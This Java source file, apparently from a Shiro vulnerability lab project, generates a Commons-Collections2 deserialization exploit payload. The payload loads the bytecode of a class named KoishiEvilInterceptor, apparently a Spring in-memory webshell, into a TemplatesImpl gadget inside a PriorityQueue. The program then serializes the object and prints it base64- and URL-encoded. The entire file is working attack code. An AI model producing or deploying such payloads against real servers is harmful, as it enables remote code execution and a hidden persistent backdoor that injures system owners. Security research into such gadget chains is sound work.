package com.shiro.vuln.SpringMemShell.koishi_Gadgets;

import com.shiro.vuln.SpringMemShell.Controller.KoishiEvilController;
import com.shiro.vuln.SpringMemShell.Interceptor.KoishiEvilInterceptor;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.ibatis.javassist.ClassPool;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.PriorityQueue;


public class CommonCollections2 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();

        byte[] bytes = ClassPool.getDefault().get(KoishiEvilInterceptor.class.getName()).toBytecode();

        setFieldValue(templates,"_bytecodes",new byte[][]{bytes});
        setFieldValue(templates,"_name","koiShi");
        setFieldValue(templates,"_class",null);
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());

        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",null,null);
        TransformingComparator transformingComparator =new TransformingComparator(invokerTransformer);
        PriorityQueue priorityQueue = new PriorityQueue();
        setFieldValue(priorityQueue,"size",2);
        setFieldValue(priorityQueue,"queue",new Object[]{templates,templates});
        setFieldValue(priorityQueue,"comparator",transformingComparator);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream os = new ObjectOutputStream(byteArrayOutputStream);
        os.writeObject(priorityQueue);
        os.close();

        String payload = URLEncoder.encode(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));
        //payload = new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));
        System.out.println(payload);
/*        byte[] decode = Base64.getDecoder().decode(payload);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decode));
        ois.readObject();*/
    }


    public static void setFieldValue(Object obj,String fileName,Object value) throws  NoSuchFieldException, IllegalAccessException {
        Field f = obj.getClass().getDeclaredField(fileName);
        f.setAccessible(true);
        f.set(obj,value);
    }
}
